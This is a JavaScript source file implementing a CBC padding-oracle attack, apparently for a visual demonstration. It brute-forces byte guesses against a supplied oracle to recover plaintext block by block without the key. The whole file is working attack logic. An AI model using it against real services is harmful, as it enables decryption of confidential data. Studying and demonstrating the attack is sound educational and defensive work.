import { splitBlocks, bytesToBase64 } from "./blocks";

export async function runPaddingAttack(
  cipher,
  oracle,
  onUpdate,
  speed = 0,
  fastMode = true
) {
  const blocks = splitBlocks(cipher);

  let plaintextBytes = [];
  let totalBytes = (blocks.length - 1) * 16;
  let processed = 0;

  const BATCH = 16;

  for (let b = blocks.length - 1; b > 0; b--) {
    const curr = blocks[b];
    const prev = blocks[b - 1];

    let intermediate = new Uint8Array(16);
    let recovered = new Uint8Array(16);

    for (let i = 15; i >= 0; i--) {
      const pad = 16 - i;

      let found = false;

      for (let k = 0; k < 256; k += BATCH) {
        const promises = [];

        for (let guess = k; guess < k + BATCH; guess++) {
          let modified = new Uint8Array(prev);

          for (let j = 15; j > i; j--) {
            modified[j] = intermediate[j] ^ pad;
          }

          modified[i] = guess;

          const forged = new Uint8Array(32);
          forged.set(modified, 0);
          forged.set(curr, 16);

          const payload = bytesToBase64(forged);

          promises.push(
            oracle(payload).then((res) => ({
              res,
              guess,
            }))
          );
        }

        const results = await Promise.all(promises);

        const valid = results.find(
          (r) => r.res.status === "valid"
        );

        // throttled UI updates
        if (!fastMode || k % 32 === 0) {
          onUpdate({
            block: b,
            byte: i,
            guesses: results.map((r) => r.guess),
            statusBatch: results.map((r) => r.res.status),
          });
        }

        if (valid) {
          const guess = valid.guess;

          intermediate[i] = guess ^ pad;
          recovered[i] = intermediate[i] ^ prev[i];

          plaintextBytes.unshift(recovered[i]);

          processed++;
          const progress =
            (processed / totalBytes) * 100;

          onUpdate({
            block: b,
            byte: i,
            guess,
            status: "valid",
            progress,
            recoveredText: new TextDecoder().decode(
              new Uint8Array(plaintextBytes)
            ),
          });

          found = true;
          break;
        }

        if (!fastMode && speed > 0) {
          await new Promise((r) =>
            setTimeout(r, speed)
          );
        }
      }

      if (!found) {
        // fallback (rare)
        recovered[i] = 0;
      }
    }
  }

  return new TextDecoder().decode(
    new Uint8Array(plaintextBytes)
  );
}